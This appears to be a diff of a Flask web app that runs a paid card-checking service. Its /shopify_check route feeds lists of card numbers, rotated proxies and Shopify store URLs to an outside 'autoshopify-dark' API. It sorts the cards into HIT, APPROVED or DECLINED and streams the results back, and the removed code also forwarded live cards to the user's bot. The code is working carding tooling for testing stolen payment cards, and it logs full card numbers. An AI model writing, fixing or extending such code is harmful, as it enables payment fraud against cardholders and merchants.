@@ -653,146 +653,128 @@ def shopify_check():
         return redirect(url_for('login'))
     return render_template('shopify.html', username=session.get('username'), credits=session.get('credits', 0))
     
-@app.route('/shopify_check', methods=['GET', 'POST'])
+@app.route('/shopify_check', methods=['GET'])
 def shopify_check_process():
     if 'user_id' not in session or 'access_key' not in session:
         return jsonify({'error': 'Authentication required'}), 401
     
-    # Handle both GET (from EventSource) and POST (from form) requests
-    if request.method == 'POST':
-        # Get form data
-        sites = request.form.get('sites', '').strip().split('\n')
-        proxies = request.form.get('proxies', '').strip().split('\n')
-        cards = request.form.get('cards', '').strip().split('\n')
-    else:  # GET request from EventSource
+    try:
+        # Get parameters from GET request
         sites = request.args.get('sites', '').strip().split('\n')
         proxies = request.args.get('proxies', '').strip().split('\n')
         cards = request.args.get('cards', '').strip().split('\n')
-    
-    # Clean up empty lines
-    sites = [site.strip() for site in sites if site.strip()]
-    proxies = [proxy.strip() for proxy in proxies if proxy.strip()]
-    cards = [card.strip() for card in cards if card.strip()]
-    
-    if not sites or not cards:
-        return jsonify({'error': 'Sites and cards are required'}), 400
-    
-    # Prepare for streaming response
-    def generate():
-        for i, card in enumerate(cards):
-            # Select a random site
-            site = random.choice(sites) if sites else ""
-            
-            # Select a random proxy if available
-            proxy = random.choice(proxies) if proxies else None
-            
-            # Prepare proxy dict if available
-            proxy_dict = None
-            if proxy:
-                proxy_parts = proxy.split(':')
-                if len(proxy_parts) == 4:
-                    ip, port, username, password = proxy_parts
-                    proxy_dict = {
-                        'http': f'http://{username}:{password}@{ip}:{port}',
-                        'https': f'http://{username}:{password}@{ip}:{port}'
-                    }
-                elif len(proxy_parts) == 2:
-                    ip, port = proxy_parts
-                    proxy_dict = {
-                        'http': f'http://{ip}:{port}',
-                        'https': f'http://{ip}:{port}'
-                    }
-            
-            # Prepare the API URL
-            api_url = f"https://autoshopify-dark.sevalla.app/index.php?site={site}&cc={card}"
-            if proxy:
-                api_url += f"&proxy={proxy}"
-            
-            try:
-                # Make the request
-                response = requests.get(api_url, proxies=proxy_dict, timeout=30)
-                data = response.json()
-                
-                response_text = data.get('Response', '').upper()
-                status_from_api = data.get('Status', '').lower()
-                price = data.get('Price', 'N/A')
-                gateway = data.get('Gateway', 'N/A')
-                
-                # Determine status based on API response
-                if status_from_api == 'true':
-                    if '3D' in response_text or 'OTP' in response_text:
-                        bot_response = data.get('Response', 'Unknown')
-                        status = 'APPROVED_OTP'
-                    elif any(x in response_text for x in ['THANK YOU', 'INSUFFICIENT', 'APPROVED', 'SUCCESS']):
-                        bot_response = data.get('Response', 'Unknown')
-                        status = 'HIT'
-                    else:
-                        bot_response = data.get('Response', 'Unknown')
-                        status = 'APPROVED'
-                else:
-                    if any(x in response_text for x in ['INCORRECT_CVC', 'INCORRECT_ZIP', 'CVV', 'ZIP']):
-                        bot_response = data.get('Response', 'Unknown')
-                        status = 'APPROVED'
-                    elif 'EXPIRED_CARD' in response_text:
-                        bot_response = 'EXPIRE_CARD'
-                        status = 'EXPIRED'
-                    elif 'DECLINED' in response_text:
-                        bot_response = data.get('Response', 'Unknown')
-                        status = 'DECLINED'
-                    else:
-                        bot_response = data.get('Response', 'Unknown')
-                        status = 'DECLINED'
-                
-                # Send approved cards to user's bot
-                if status in ['APPROVED', 'APPROVED_OTP', 'HIT']:
-                    try:
-                        send_card_to_user_bot(
-                            session['user_id'],
-                            {
-                                'card': card,
-                                'status': status,
-                                'response': bot_response,
-                                'gateway': 'SHOPIFY',
-                                'bin': {},
-                                'timestamp': datetime.now().strftime("%H:%M:%S"),
-                                'amount': price
-                            }
-                        )
-                    except Exception as bot_error:
-                        print(f"Bot notification failed: {bot_error}")
-                
-                # Send result via SSE
-                result_data = {
-                    'card': card,
-                    'status': status,
-                    'response': bot_response,
-                    'gateway': gateway,
-                    'amount': price,
-                    'site': site,
-                    'proxy': proxy or 'None'
-                }
-                
-                yield f"data: {json.dumps(result_data)}\n\n"
-                
-            except Exception as e:
-                error_data = {
-                    'card': card,
-                    'status': 'ERROR',
-                    'response': f'Request failed: {str(e)}',
-                    'gateway': 'SHOPIFY',
-                    'amount': 'N/A',
-                    'site': site,
-                    'proxy': proxy or 'None'
-                }
-                yield f"data: {json.dumps(error_data)}\n\n"
-            
-            # Small delay between requests
-            time.sleep(0.5)
         
-        # Send completion message
-        yield f"data: {json.dumps({'complete': True})}\n\n"
+        # Clean up empty lines
+        sites = [site.strip() for site in sites if site.strip()]
+        proxies = [proxy.strip() for proxy in proxies if proxy.strip()]
+        cards = [card.strip() for card in cards if card.strip()]
+        
+        if not sites or not cards:
+            return jsonify({'error': 'Sites and cards are required'}), 400
+        
+        # Prepare for streaming response
+        def generate():
+            for i, card in enumerate(cards):
+                # Select a random site
+                site = random.choice(sites) if sites else ""
+                
+                # Select a random proxy if available
+                proxy = random.choice(proxies) if proxies else None
+                
+                # Prepare the API URL
+                api_url = f"https://autoshopify-dark.sevalla.app/index.php?site={site}&cc={card}"
+                if proxy:
+                    api_url += f"&proxy={proxy}"
+                
+                print(f"Making request to: {api_url}")  # Debug print
+                
+                try:
+                    # Make the request to the external API
+                    response = requests.get(api_url, timeout=30)
+                    print(f"API Response status: {response.status_code}")
+                    print(f"API Response content: {response.text}")
+                    
+                    if response.status_code == 200:
+                        try:
+                            data = response.json()
+                            result_data = {
+                                'card': card,
+                                'status': 'SUCCESS',
+                                'response': data.get('Response', 'No response'),
+                                'gateway': data.get('Gateway', 'N/A'),
+                                'amount': data.get('Price', 'N/A'),
+                                'site': site,
+                                'proxy': proxy or 'None',
+                                'api_url': api_url
+                            }
+                        except json.JSONDecodeError:
+                            result_data = {
+                                'card': card,
+                                'status': 'ERROR',
+                                'response': f'Invalid JSON response: {response.text}',
+                                'gateway': 'N/A',
+                                'amount': 'N/A',
+                                'site': site,
+                                'proxy': proxy or 'None',
+                                'api_url': api_url
+                            }
+                    else:
+                        result_data = {
+                            'card': card,
+                            'status': 'ERROR',
+                            'response': f'API returned status {response.status_code}',
+                            'gateway': 'N/A',
+                            'amount': 'N/A',
+                            'site': site,
+                            'proxy': proxy or 'None',
+                            'api_url': api_url
+                        }
+                    
+                    yield f"data: {json.dumps(result_data)}\n\n"
+                    
+                except requests.exceptions.RequestException as e:
+                    error_data = {
+                        'card': card,
+                        'status': 'ERROR',
+                        'response': f'Request failed: {str(e)}',
+                        'gateway': 'N/A',
+                        'amount': 'N/A',
+                        'site': site,
+                        'proxy': proxy or 'None',
+                        'api_url': api_url
+                    }
+                    yield f"data: {json.dumps(error_data)}\n\n"
+                except Exception as e:
+                    error_data = {
+                        'card': card,
+                        'status': 'ERROR',
+                        'response': f'Unexpected error: {str(e)}',
+                        'gateway': 'N/A',
+                        'amount': 'N/A',
+                        'site': site,
+                        'proxy': proxy or 'None',
+                        'api_url': api_url
+                    }
+                    yield f"data: {json.dumps(error_data)}\n\n"
+                
+                # Small delay between requests
+                time.sleep(1)
+            
+            # Send completion message
+            yield f"data: {json.dumps({'complete': True})}\n\n"
+        
+        return Response(stream_with_context(generate()), mimetype='text/event-stream')
     
-    return Response(stream_with_context(generate()), mimetype='text/event-stream')
+    except Exception as e:
+        def generate_error():
+            error_data = {
+                'status': 'ERROR',
+                'response': f'Server setup error: {str(e)}'
+            }
+            yield f"data: {json.dumps(error_data)}\n\n"
+            yield f"data: {json.dumps({'complete': True})}\n\n"
+        
+        return Response(stream_with_context(generate_error()), mimetype='text/event-stream')
     
 @app.route('/gen', methods=['GET', 'POST'])
 def gen_card():
